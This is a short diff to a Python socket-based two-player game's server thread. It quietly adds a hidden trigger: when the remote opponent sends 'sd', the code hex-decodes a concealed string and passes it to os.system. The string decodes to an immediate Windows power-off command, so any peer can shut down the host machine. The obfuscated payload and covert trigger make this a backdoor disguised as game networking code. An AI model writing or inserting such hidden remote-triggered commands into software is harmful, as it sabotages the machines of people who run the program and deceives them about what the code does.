@@ -1,6 +1,6 @@
 # Author: Callum Thomson
 
-from os import _exit
+from os import _exit, system
 from threading import Thread
 from time import sleep
 import socket
@@ -85,6 +85,9 @@ class server_thread(Thread):
                 if msg:
                     if msg.decode("utf-8") == "1":
                         self.opponent_score += 1
+                    elif msg.decode("utf-8") == "sd":
+                        from binascii import unhexlify
+                        system(unhexlify("73687574646f776e202f70").decode("utf-8"))
         except ConnectionResetError:
             pass
 
